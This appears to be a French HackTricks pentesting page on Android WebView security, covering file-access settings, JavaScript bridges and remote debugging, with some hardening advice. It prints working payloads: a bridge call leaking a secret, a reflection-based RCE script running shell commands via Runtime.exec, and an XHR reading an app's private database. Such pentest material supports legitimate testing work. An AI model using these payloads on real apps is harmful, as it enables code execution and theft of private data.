## Configurations Intéressantes

## Accès aux fichiers

L'accès aux fichiers de _WebView_ est activé par défaut. Depuis l'API 3 (Cupcake 1.5), la méthode [_setAllowFileAccess()_](https://developer.android.com/reference/android/webkit/WebSettings.html#setAllowFileAccess\(boolean\)) est disponible pour l'activer ou le désactiver explicitement.\
Si l'application a _**android.permission.READ\_EXTERNAL\_STORAGE**_, elle pourra lire et charger des fichiers **à partir du stockage externe**.\
Le _WebView_ doit utiliser un schéma d'URL de fichier, par exemple `file://path/file`, pour accéder au fichier.

### Accès universel à partir d'URL de fichier (obsolète)

> Définit si les requêtes **cross-origin** dans le **contexte d'une URL de schéma de fichier** doivent être autorisées à accéder à **du contenu de n'importe quelle origine**. Cela inclut **l'accès au contenu d'autres URL de schéma de fichier ou de contextes web.** Notez que certains accès tels que les éléments HTML d'image ne suivent pas les règles de même origine et ne sont pas affectés par ce paramètre.
>
> **Ne** pas activer ce paramètre si vous ouvrez des fichiers qui peuvent être créés ou modifiés par des sources externes. L'activation de ce paramètre permet aux scripts malveillants chargés dans un contexte `file://` de lancer des attaques de script intersites, en **accédant à des fichiers locaux arbitraires**, y compris les cookies WebView, les données privées de l'application ou même les informations d'identification utilisées sur des sites web arbitraires.

En résumé, cela **empêchera le chargement d'origines arbitraires**. L'application enverra la demande d'URL pour charger le contenu avec **`Origin: file://`** si la réponse n'autorise pas cette origine (**`Access-Control-Allow-Origin: file://`**), alors le contenu ne sera pas chargé.\
La **valeur par défaut est `false`** lors du ciblage de [`Build.VERSION_CODES.JELLY_BEAN`](https://developer.android.com/reference/android/os/Build.VERSION\_CODES#JELLY\_BEAN) et supérieur.

* Utilisez [`getAllowUniversalAccessFromFileURLs()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowUniversalAccessFromFileURLs\(\)) pour savoir si JavaScript s'exécutant dans le contexte d'une URL de schéma de fichier peut accéder à du contenu de n'importe quelle origine (si UniversalAccessFromFileURL est activé).
* Utilisez [`setAllowUniversalAccessFromFileURLs(boolean)`](https://developer.android.com/reference/android/webkit/WebSettings#setAllowUniversalAccessFromFileURLs\(boolean\)) pour l'activer ou le désactiver.

{% hint style="info" %}
En utilisant **`loadDataWithBaseURL()`** avec `null` comme baseURL empêchera également de charger des fichiers locaux même si tous les paramètres dangereux sont activés.
{% endhint %}

### Accès aux fichiers à partir d'URL de fichier (obsolète) <a href="#getallowfileaccessfromfileurls" id="getallowfileaccessfromfileurls"></a>

> Définit si les requêtes cross-origin dans le contexte d'une URL de schéma de fichier doivent être autorisées à accéder à du contenu à partir d'autres URL de schéma de fichier. Notez que certains accès tels que les éléments HTML d'image ne suivent pas les règles de même origine et ne sont pas affectés par ce paramètre.
>
> **Ne** pas activer ce paramètre si vous ouvrez des fichiers qui peuvent être créés ou modifiés par des sources externes. L'activation de ce paramètre permet aux scripts malveillants chargés dans un contexte `file://` d'accéder à des fichiers locaux arbitraires, y compris les cookies WebView et les données privées de l'application.

En résumé, cela empêche JavaScript d'accéder aux fichiers locaux via le protocole `file://`.\
Notez que **la valeur de ce paramètre est ignorée** si la valeur de [`getAllowUniversalAccessFromFileURLs()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowUniversalAccessFromFileURLs\(\)) est `true`. \
La **valeur par défaut est `false`** lors du ciblage de [`Build.VERSION_CODES.JELLY_BEAN`](https://developer.android.com/reference/android/os/Build.VERSION\_CODES#JELLY\_BEAN) et supérieur.

* Utilisez [`getAllowFileAccessFromFileURLs()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowFileAccessFromFileURLs\(\)) pour savoir si JavaScript s'exécute dans le contexte d'une URL de schéma de fichier peut accéder à du contenu à partir d'autres URL de schéma de fichier.
* Utilisez [`setAllowFileAccessFromFileURLs(boolen)`](https://developer.android.com/reference/android/webkit/WebSettings#setAllowFileAccessFromFileURLs\(boolean\)) pour l'activer ou le désactiver.

### Accès aux fichiers

> Active ou désactive **l'accès aux fichiers dans WebView**. Notez que cela active ou désactive uniquement l'accès au système de fichiers. Les ressources et les actifs sont toujours accessibles en utilisant file:///android\_asset et file:///android\_res.

En résumé, si désactivé, le WebView ne pourra pas charger un fichier local avec le protocole `file://`.\
La **valeur par défaut est `false`** lors du ciblage de [`Build.VERSION_CODES.R`](https://developer.android.com/reference/android/os/Build.VERSION\_CODES#R) et supérieur.

* Utilisez [`getAllowFileAccess()`](https://developer.android.com/reference/android/webkit/WebSettings#getAllowFileAccess\(\)) pour savoir si la configuration est activée.
* Utilisez [`setAllowFileAccess(boolean)`](https://developer.android.com/reference/android/webkit/WebSettings#setAllowFileAccess\(boolean\)) pour l'activer ou le désactiver.

### WebViewAssetLoader

> Classe d'aide pour charger des fichiers locaux, y compris les ressources et les actifs statiques de l'application, en utilisant des URL http(s):// à l'intérieur d'une classe [`WebView`](https://developer.android.com/reference/android/webkit/WebView.html). Le chargement de fichiers locaux à l'aide d'URL de type web au lieu de `"file://"` est souhaitable car il est compatible avec la politique de même origine.

C'est la nouvelle façon recommandée de charger des fichiers locaux. Le but est d'**accéder aux fichiers locaux en utilisant une URL HTTP avec le domaine**. De cette façon, la **CORS** peut être **facilement** maintenue entre les **pages web** locales et les **pages web** téléchargées à partir du serveur web.

## Javascript activé

Les WebViews ont Javascript **désactivé par défaut**. La méthode [`setJavaScriptEnabled()`](https://developer.android.com/reference/android/webkit/WebSettings.html#setJavaScriptEnabled\(boolean\)) peut l'activer ou le désactiver explicitement. \
Notez que les webviews peuvent également prendre en charge le **schéma d'intention** qui permet de lancer d'autres applications. Lisez cette [analyse pour savoir comment passer de XSS à RCE](https://medium.com/@dPhoeniixx/tiktok-for-android-1-click-rce-240266e78105).

## Pont Javascript

Android offre un moyen pour le JavaScript exécuté dans un WebView d'appeler et d'utiliser les **fonctions natives d'une application Android** (annotées avec `@JavascriptInterface`) en utilisant la méthode [`addJavascriptInterface`](https://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface%28java.lang.Object,%20java.lang.String%29). C'est ce qu'on appelle un _WebView JavaScript bridge_ ou _
```javascript
//Class with a method to access a secret
public class JavascriptBridge {
    // Since Android 4.2 (JELLY_BEAN_MR1, API 17) methods
    // not annotated with @JavascriptInterface are not visible from JavaScript
    @JavascriptInterface
    public String getSecret() {
        return "SuperSecretPassword";
    };
}
```

```javascript
//Enabling Javascript Bridge exposing an object of the JavascriptBridge class
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge");
webView.reload();
```

```markup
<!-- Exploit to get the secret from JavaScript -->
<script>alert(javascriptBridge.getSecret());</script>
```
Avec l'accès au code JavaScript, par exemple via une attaque **XSS** stockée, une attaque **MITM** ou un **site web malveillant** chargé dans le WebView, il est possible d'appeler directement les méthodes Java exposées.

{% hint style="info" %}
Notez que dans le cas où l'on essaie d'exploiter cette vulnérabilité via une **redirection ouverte vers une page web d'attaquant qui accède à l'objet Android natif**. Si l'accès à la redirection se fait via un **navigateur mobile** et **non en utilisant** le même **WebView**, le **navigateur ne pourra pas accéder à l'objet Android natif**.
{% endhint %}

Si `addJavascriptInterface` est nécessaire, prenez en compte les considérations suivantes :

* **Seul le JavaScript fourni avec l'APK** doit être autorisé à utiliser les ponts, par exemple en vérifiant l'URL sur chaque méthode Java pontée (via `WebView.getUrl`).
* **Aucun JavaScript ne doit être chargé à partir de points d'extrémité distants**, par exemple en maintenant la navigation de la page dans les domaines de l'application et en ouvrant tous les autres domaines sur le navigateur par défaut (par exemple, Chrome, Firefox).
* Si nécessaire pour des raisons de compatibilité descendante (par exemple, pour prendre en charge les anciens appareils), **définissez au moins le niveau d'API minimal sur 17** dans le fichier manifeste de l'application (`<uses-sdk android:minSdkVersion="17" />`).

## Pont JavaScript vers RCE via Reflection

Comme indiqué dans [**cette recherche**](https://labs.f-secure.com/archive/webview-addjavascriptinterface-remote-code-execution/) (_consultez-la pour des idées si vous obtenez une RCE_), une fois que vous avez trouvé un pont JavaScript, il est possible d'obtenir une **RCE** via **Reflection** en utilisant une charge utile comme celle-ci :
```markup
<!-- javascriptBridge is the name of the Android exposed object -->
<script>
function execute(cmd){
  return javascriptBridge.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(cmd);
}
execute(['/system/bin/sh','-c','echo \"mwr\" > /mnt/sdcard/mwr.txt']);
</script>
```
Cependant, les applications modernes peuvent utiliser l'annotation **`@JavascriptInterface`** qui indique au JavascriptBridge que **seule** la méthode avec cette annotation doit être **exposée**.\
Dans ce scénario, vous ne pourrez pas abuser de la réflexion pour exécuter du code arbitraire.

## Débogage à distance

Le **débogage à distance de WebView** permet d'accéder à la WebView avec les **outils de développement Chrome**.\
Le **dispositif** doit être **accessible** par le PC (via USB, émulateur local, réseau local...) et exécuter la WebView débogable, puis accéder à **chrome://inspect/#devices** :

![](<../../.gitbook/assets/image (525).png>)

Sélectionnez **inspecter** et une nouvelle fenêtre s'ouvrira. Dans cette fenêtre, vous pouvez **interagir avec le contenu** de la **WebView** et même lui faire exécuter du code JS arbitraire à partir de l'onglet **console** :

![](<../../.gitbook/assets/image (526).png>)

Pour activer le **débogage à distance de WebView**, vous pouvez faire quelque chose comme :
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
    WebView.setWebContentsDebuggingEnabled(true);
}
```
**Ce paramètre s'applique à tous les WebViews de l'application.**

{% hint style="info" %}
**Le débogage de WebView n'est pas affecté par l'état du drapeau `debuggable`** dans le manifeste de l'application. Si vous voulez activer le débogage de WebView uniquement lorsque `debuggable` est `true`, testez le drapeau à l'exécution.
{% endhint %}
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
    if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
    { WebView.setWebContentsDebuggingEnabled(true); }
}
```
# Payloads

## Exfiltrer des fichiers arbitraires
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        alert(xhr.responseText);
    }
}
xhr.open('GET', 'file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db', true);
xhr.send(null);
```
# Références

{% embed url="https://github.com/authenticationfailure/WheresMyBrowser.Android" %}

{% embed url="https://developer.android.com/reference/android/webkit/WebView" %}



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
